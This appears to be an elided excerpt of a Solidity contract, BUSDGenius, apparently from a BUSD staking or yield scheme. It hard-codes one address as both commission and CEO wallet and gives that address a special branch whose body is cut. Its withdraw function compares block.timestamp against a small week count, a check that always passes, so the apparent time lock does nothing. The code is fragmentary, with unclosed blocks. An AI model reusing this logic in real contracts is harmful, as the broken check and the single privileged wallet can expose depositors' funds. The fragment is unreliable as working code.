...
contract BUSDGenius {
    ...
    constructor() public {
        token = IBEP20(busd);
        commissionWallet = 0x697418EB688db1B0822D21C78C022912581C0388;
        ceoWallet = 0x697418EB688db1B0822D21C78C022912581C0388;
  ...
  if(msg.sender == commissionWallet)
    ...
    function withdraw() public {
        User storage user = users[msg.sender];
        uint256 weeksPast = 1 + block.timestamp.mul(10).div(ONE_WEEK).div(10);

if (block.timestamp >= weeksPast) {
